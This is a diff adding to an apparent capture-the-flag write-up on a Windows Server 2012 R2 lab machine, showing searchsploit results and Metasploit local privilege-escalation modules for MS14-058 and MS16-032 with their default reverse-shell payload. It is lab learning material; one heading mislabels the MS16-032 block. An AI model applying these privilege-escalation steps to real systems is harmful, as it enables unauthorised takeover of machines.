@@ -408,3 +408,47 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.8
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
+From this, we know it's Microsoft Windows Server 2012 R2 Standard x64.
+
+Let's do a quick Searchsploit and Google search.
+```
+hippoeug@kali:~$ searchsploit windows server 2012
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+...
+Microsoft Windows 8.1/ Server 2012 - 'Win32k.sys' Local Privilege Escalation (MS14-058)                                             | windows/local/46945.cpp
+...
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+```
+Googling "windows server 2012 r2 privilege escalation", we see an exploit for `MS16-032`.
+
+Both `MS14-058` and `MS16-032` vulnerabilties both have Metasploit exploits for them. 
+
+For `MS14-058`:
+```
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+
+Module options (exploit/windows/local/ms14_058_track_popup_menu):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+...
+```
+For `MS14-058`:
+```
+msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp   
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+...
+```
+However, they require existing Metasploit sessions before privilege esclating them.
